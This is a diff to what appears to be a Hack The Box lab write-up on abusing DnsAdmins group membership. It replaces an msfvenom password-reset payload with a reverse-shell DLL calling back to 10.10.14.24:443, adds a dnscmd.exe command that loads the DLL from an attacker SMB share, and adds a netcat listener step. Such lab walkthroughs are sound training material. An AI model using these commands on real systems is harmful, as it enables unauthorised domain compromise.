@@ -222,9 +222,9 @@ Members of DNSAdmins group have access to network DNS information. The default p
 The user ryan is found to be a member of DnsAdmins. Being a member of the DnsAdmins group allows the use of dnscmd.exe to specify a plugin DLL that should be loaded by the DNS service. 
 
 ### MSFVenom DLL
-  - Create a payload that changes the administrator password.
+  - Create a reverse shell payload.
 ```CSS
-▶ msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > payload.dll
+▶ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 -f dll -o payload.dll
 ```
 Upload the `payload.dll` file.
 
@@ -235,6 +235,9 @@ Upload the `payload.dll` file.
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1f640e54-11bc-423e-8654-79599d129966)
 
 ```CSS
-
+*Evil-WinRM* PS C:\Users\ryan\Desktop> dnscmd.exe /config /serverlevelplugindll \\10.10.14.24\pwnshare\payload.dll
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e250d7a8-6133-495a-9b13-9c3eb5ff78ea)
+
+- Netcat Listener
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/43e31f79-f1e0-4902-b9fa-2e48f04588ab)
